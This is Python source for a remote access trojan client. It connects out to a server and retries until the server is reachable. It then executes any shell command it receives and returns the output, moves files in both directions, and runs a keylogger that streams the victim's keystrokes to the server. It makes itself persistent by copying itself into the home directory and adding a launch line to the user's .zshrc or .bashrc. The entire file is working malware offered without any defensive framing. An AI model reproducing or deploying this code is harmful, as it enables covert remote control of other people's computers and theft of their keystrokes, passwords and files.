import socket, subprocess, os, sys
import random
from threading import Thread
from time import sleep
from pynput import keyboard
import pynput

SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
SERVER_PORT = 8080 #DEFAULT SERVER PORT
BUFFER_SIZE = 1024 * 128 #128KB max size

#If the user sends a custom IP and port
if len(sys.argv) == 2: #only custom IP
    SERVER_HOST = sys.argv[1]
elif len(sys.argv) == 3: #custom IP and port
    SERVER_HOST = sys.argv[1]
    try:
        SERVER_PORT = int(sys.argv[2])
    except:
        print("Can not cast port to int!")

#Keylogging Functions
def on_key_press(key):
    if not keyLoggerAlive:
        return False
    if key == keyboard.Key.enter:
        s.send("ENTER".encode())
    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        return
    elif key == keyboard.Key.backspace:
        s.send("BACKSPACE".encode())
    elif key == keyboard.Key.space:
        s.send(" ".encode())
    else:
        key = str(key)
        key = key.strip("'")
        s.send(key.encode())

#Keylogging Functions
def start_keylog():
    with pynput.keyboard.Listener(on_press=on_key_press) as listener:
        global keyLoggerAlive
        if not keyLoggerAlive:
            pynput.keyboard.Listener.stop()
            listener.stop()
        else:
            listener.join()

#For persistence, see if the user uses zsh or bash. If they use neither, then don't do any persistence.
try:
    #If they use zshrc, set that to the rcFile to edit
    if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
        rcFile = ".zshrc"
        NO_PERSISTENCE = False
    #if they don't use zshrc, see if they use bashrc
    elif os.path.exists(f"{os.path.expanduser('~')}/.bashrc"):
        rcFile = ".bashrc"
        NO_PERSISTENCE = False
    else:
        NO_PERSISTENCE = True

    #Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
    with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
        if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
            MAKE_PERSISTENT = True
        else:
            MAKE_PERSISTENT = False

    #If we want to make it persistent and a file to edit exists, do it.
    if MAKE_PERSISTENT and not NO_PERSISTENCE: 
        subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
        with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
            file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
except:
    pass

DISCONNECTED = True #Initially, start disconnected

while DISCONNECTED:
    #If the server is down, keep trying.
    try:
        s = socket.socket() #Establish socket connection
        s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
        DISCONNECTED = False
    except:
        sleep(random.randint(0,10)) #Try to join the server every 0-10 seconds

#When finally connected, start our shell
while True:
    command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
    splitted_command = command.split() #Split the command
    if command == "exit": #if the user wants to exit, then keep connection alive
        continue
    elif command == "SERVER_SHUTDOWN":
        break
    elif splitted_command[0] == "cd": #if the user wants to change directories
        try:
            os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
        except FileNotFoundError as e: #if it isn't a thing, output the error to a variable
            output = str(e)
            continue
        else: #if it worked, don't send anything
            output = ""
            continue
    elif splitted_command[0] == "echo":
        output = subprocess.getoutput(command)
        output = "Echoed!"
    elif command == "UPLOADING_FILE_FROM_S3RVER":
        s.send("READY".encode())
        path = s.recv(BUFFER_SIZE).decode()
        splittedBySlash = path.split("/")
        path = splittedBySlash[len(splittedBySlash)-1]
        with open(path,"wb") as f:
            data = s.recv(BUFFER_SIZE)
            while data:
                if data.decode() == "UPLOADING_FILE_FROM_S3RVER_COMPLETE":
                    s.send("DONE".encode())
                    break
                f.write(data)
                s.send("ACK".encode())
                data = s.recv(BUFFER_SIZE)
    elif command == "DOWNLOAD_FILE_FROM_S3RVER":
        s.send("READY".encode()) #Tell server client is ready for download
        try:
            path = s.recv(BUFFER_SIZE).decode() #Get the path of file to download
            with open(path,"rb") as f: #Open the file
                data = f.read(BUFFER_SIZE) #Read 1024bytes and store as var
                while data: #While the var is not None
                    s.send(data) #Send the data to the server
                    if s.recv(BUFFER_SIZE).decode() == "ACK": #If the server recieved it, it will send ACK
                        data = f.read(BUFFER_SIZE) #Read more and repeat
                    else: #If the server did not send ACK then break the loop
                        break
                        
            s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())

        except FileNotFoundError or FileExistsError as e:
            s.send("DOWNLOAD_ERROR")
        except Exception as e:
            s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())

    elif command == "START_KEYL0GGER":
        global keyLoggerAlive
        keyLoggerAlive = True
        keyLogThread = Thread(target=start_keylog)
        keyLogThread.start()
        if s.recv(BUFFER_SIZE).decode() == "KEY_L0GGER-END":
            keyLoggerAlive = False
            continue

    else: #if the user doesn't want to perform a special action, run the command and capture the output
        #if the command runs for longer than 5 seconds, timeout
        try:
            output = subprocess.run(command, shell=True,capture_output=True,text=True,timeout=5).stdout 
        except subprocess.TimeoutExpired:
            continue
    message = f"{output}" #encapsulate the output and send it
    s.send(message.encode())

s.close() #close the socket on exit

